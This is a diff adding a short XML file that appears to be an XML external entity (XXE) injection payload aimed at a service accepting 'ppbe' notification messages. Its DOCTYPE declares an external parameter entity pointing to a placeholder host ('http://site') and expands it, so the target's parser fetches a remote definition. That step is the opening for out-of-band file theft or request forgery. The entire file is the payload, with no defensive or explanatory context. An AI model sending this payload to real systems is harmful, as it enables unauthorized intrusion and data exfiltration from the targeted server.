@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE zsl [
+<!ENTITY % xxe SYSTEM "http://site">
+%xxe;]>
+<ppbe>
+<target>
+<command>action.notification.recipient.present</command>
+</target>
+<inquire />
+</ppbe>
